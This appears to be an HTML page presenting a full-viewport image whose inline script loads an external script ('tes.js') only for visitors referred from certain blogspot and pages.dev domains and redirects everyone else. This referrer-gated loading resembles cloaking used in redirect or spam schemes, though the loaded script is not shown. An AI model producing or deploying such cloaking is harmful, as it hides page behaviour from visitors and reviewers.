<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Full-Viewport Image</title>
    <style>
        /* Mengatur tampilan body dan html */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }

        /* Mengatur tampilan gambar */
        .background-image {
            background-image: url('images/redirects.jpg'); /* Ubah dengan jalur gambar di repositori Anda */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            width: 100vw;
            height: 100vh;
        }
    </style>
    <script>
        // Daftar allowed domains
        const allowedDomains = [
            'https://kltraid.pages.dev',
            'https://akusukagratisanlo.blogspot.com',
            'https://www.kltraid.online',
            'https://bikinbaru96.blogspot.com'
        ];

        // Ambil referer
        const referer = document.referrer;

        // Cek referer dan load kmzway87aa.js hanya jika sesuai
        if (referer && allowedDomains.some(domain => referer.startsWith(domain))) {
            // Buat elemen script untuk memuat kmzway87aa.js
            const script = document.createElement('script');
            script.src = 'tes.js';
            document.head.appendChild(script);
        } else {
            // Redirect ke halaman utama jika akses langsung atau referer tidak sesuai
            window.location.href = 'https://kltraid.pages.dev';
        }
    </script>
</head>
<body>
    <div class="background-image"></div>
</body>
</html>
